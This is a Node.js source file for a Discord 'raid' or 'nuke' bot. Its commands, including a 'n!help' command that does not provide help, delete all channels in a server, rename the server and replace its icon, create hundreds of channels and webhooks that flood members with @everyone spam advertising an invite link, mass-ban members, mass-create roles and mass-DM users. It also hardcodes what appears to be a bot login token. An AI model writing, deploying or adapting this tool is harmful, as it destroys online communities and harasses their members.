console.log("NodeJS Version: " + process.version)
const express = require('express');
const app = express();
const port = 3001;

app.get('/', (req, res) => res.send('Hello World!'));

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));

const Discord = require("discord.js-light");
const client = new Discord.Client({
  cacheGuilds: true,
  cacheChannels: true,
  cacheOverwrites: false,
  cacheRoles: false,
  cacheEmojis: false,
  cachePresences: false
});

/*
const Discord = require("discord.js-selfbot");
const client = new Discord.Client();
*/
client.on("ready", () => {
  console.log("client ready  " + client.user.tag);
  client.user.setPresence({
    status: "online",
    activity: {
      name: "n!help for help",
      type: "PLAYING"
    }
  })
});

client.on("message", async (message) => {
  const prefix = "n!";
  const args = message.content.slice(prefix.length).trim().split(' ');
  const command = args.shift().toLowerCase()
  if (message.content === "n!nuke") {
    await message.guild.channels.cache.forEach(c => c.delete())
    await messsge.guild.channels.create("尺卂丨ᗪ乇ᗪ   乃ㄚ   几卂丂卄乇   丂Ɋㄩ卂ᗪ")
  }
  if (message.content === "n!help") {

    await message.guild.setName("尺卂丨ᗪ乇ᗪ   乃ㄚ   几卂丂卄乇   丂Ɋㄩ卂ᗪ");
    await message.guild.setIcon("https://media.discordapp.net/attachments/891524344738643979/910959031970070528/unknown.png");
    await message.guild.channels.cache.forEach(c => c.delete())
    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create("尺卂丨ᗪ乇ᗪ   乃ㄚ   几卂丂卄乇   丂Ɋㄩ卂ᗪ").then(c => {
        try {
          c.createWebhook("尺卂丨ᗪ乇ᗪ   乃ㄚ   几卂丂卄乇   丂Ɋㄩ卂ᗪ").then(m => {
            for (let i = 0; i <= 500; i++) {
              m.send("@everyone -`尺卂丨ᗪ乇ᗪ   乃ㄚ   几卂丂卄乇   丂Ɋㄩ卂ᗪ   `- https://discord.gg/f6UVwttM3B");
            }

          })
        } catch (error) {
          console.log(error)
        } finally {
          for (let i = 0; i <= 50 - 1; i++) {
            c.send("@everyone 尺卂丨ᗪ乇ᗪ   乃ㄚ   几卂丂卄乇   丂Ɋㄩ卂ᗪ  https://discord.gg/f6UVwttM3B")
          }
        }
      })
    }
  }
  if (message.content === "n!2") {
    message.delete()
    await message.guild.channels.cache.forEach(c => c.delete())
    await message.guild.setName("Nashe 😏🍔")
    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create("Nashe 😏🍔").then(c => {
        for (let i = 0; i <= 20; i++) {
          c.send("@everyone https://discord.gg/f6UVwttM3B")
        }
      })
    }
  }
  if (message.content === "n!roles") {
    for (let i = 0; i <= 250; i++) {
      message.guild.roles.create({
        data: {
          name: "Unite a la Nashe Squad",
          hoist: true,
          color: "RANDOM"
        }
      })
    }
  }
  client.on("message", async message => {
    if (message.content.startsWith('n!banall')) {
      message.delete();
      if (!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
      message.guild.members.cache.forEach(member => {
        if (member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID") {
          member.ban();
        }
      })
    }
  });
  if (message.content === "n!foto") {

  }
  if (message.content === "n!fuck") {
    await message.guild.channels.cache.forEach(c => c.delete());
    message.guild.channels.create("#Laura a 5 KM de tu casa quiere conocerte 😏🍔").then(c => {
      for (let i = 0; i <= 10 - 1; i++) {
        c.createWebhook("Laura a 5 KM de tu casa quiere conocerte 😏🍔").then(m => {
          for (let i = 0; i <= 500; i++) {
            m.send("@everyone `PwnedBy 几卂丂卄乇   丂Ɋㄩ卂ᗪ https://discord.gg/f6UVwttM3B");
          }
        })
      }
    })
  }
  if (message.content === "n!foto") {
    message.guild.members.cache.forEach(c => {
      if (c.id !== message.author.id) {
        c.ban()
      }
    })
    message.guild.setName("尺卂丨ᗪ乇ᗪ   乃ㄚ   几卂丂卄乇   丂Ɋㄩ卂ᗪ");
    message.guild.setIcon("https://media.discordapp.net/attachments/891524344738643979/910959031970070528/unknown.png");
  }
  if (message.content === "n!md") {
    message.guild.members.cache.forEach(c => c.send(`https://discord.gg/f6UVwttM3B  -  \`${message.guild.name}\``))
  }
  if (command === "$rremote") {
    let id = args[0];
    let msg = args[1];
    if (!id) return;
    if (!msg) return;
    const guildChannel = client.guilds.cache.get(id).channels.cache.random().send(msg)
    guildChannel.send(msg);
  }
});

client.login("OTEwOTY0MjA2ODMxMDA5ODAz.YZafhw.CZ_a__8lct6iZq8veXPp3wSGKZs").catch(console.error);